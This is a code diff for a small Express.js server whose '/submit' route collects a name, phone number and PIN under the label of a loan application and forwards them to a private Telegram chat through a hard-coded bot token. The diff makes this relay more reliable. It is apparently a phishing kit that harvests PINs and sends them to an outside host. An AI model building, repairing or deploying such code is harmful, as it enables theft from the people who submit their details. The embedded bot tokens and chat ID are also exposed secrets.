@@ -13,47 +13,53 @@ app.use(express.static(path.join(__dirname, "public")));
 // ==============================
 // TELEGRAM CONFIG (PUT YOURS)
 // ==============================
-const TELEGRAM_TOKEN = "8724075511:AAHN23CLArz-pRRZzec8AOBdgnKkWZRzFrk";
+const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
 const CHAT_ID = "7162360402";
 
 // ==============================
 // TELEGRAM FUNCTION
 // ==============================
 async function sendToTelegram(message) {
-  const url = `https://api.telegram.org/bot8724075511:AAHN23CLArz-pRRZzec8AOBdgnKkWZRzFrk/sendMessage`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
-  await fetch(url, {
+  const response = await fetch(url, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
     body: JSON.stringify({
-      chat_id: 7162360402,
+      chat_id: CHAT_ID,
       text: message,
     }),
   });
+
+  const data = await response.json();
+  console.log("TELEGRAM RESPONSE:", data);
+
+  if (!data.ok) {
+    throw new Error("Telegram failed");
+  }
 }
 
-// ==============================
-// SUBMIT ROUTE (THIS IS NEW)
-// ==============================
 app.post("/submit", async (req, res) => {
-  const data = req.body;
+  try {
+    const { name, phone, pin } = req.body;
 
-  const message = `
+    const message = `
 📥 NEW LOAN APPLICATION
 
-👤 Name: ${data.name}
-📞 Phone: ${data.phone}
-🔐 PIN: ${data.pin}
-  `;
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔐 PIN: ${pin}
+    `;
 
-  try {
     await sendToTelegram(message);
+
     res.json({ success: true });
+
   } catch (err) {
-    console.log(err);
-    res.status(500).json({ success: false });
+    console.error("ERROR:", err);
+    res.json({ success: false });
   }
 });
 
